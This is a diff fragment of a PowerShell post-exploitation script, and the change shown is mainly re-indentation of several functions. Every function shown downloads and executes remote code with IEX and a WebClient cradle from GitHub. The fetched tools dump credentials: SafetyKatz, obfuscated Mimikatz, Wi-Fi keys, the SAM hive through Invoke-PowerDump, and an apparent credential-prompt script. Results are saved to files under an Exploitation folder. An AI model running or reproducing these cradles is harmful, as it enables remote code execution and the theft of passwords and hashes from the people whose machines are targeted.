@@ -451,39 +451,39 @@ __        ___       ____
              }
         }
         While ($masterquestion -ne 10)
-        
-    function safedump
-    {
-    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+}
+
+function safedump
+{
+   	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
 	Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
-    }
+}
     
-    function obfuskittiedump
-    {
+function obfuskittiedump
+{
     	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
 	Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
         Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
-    }
-    function wificreds
-    {
+}
+function wificreds
+{
     	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
 	Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
 	Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
-    }
+}
     
-    function kittenz
-    {
+function kittenz
+{
     	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/obfuskittie.ps1')
 	Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
 	inbox >> $currentPath\Exploitation\kittenz.txt
-    }
+}
     
-    function samfile
-    {
+function samfile
+{
     	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-PowerDump.ps1')
     	Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
 	Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
-    }
 }
 
 function dumplsass
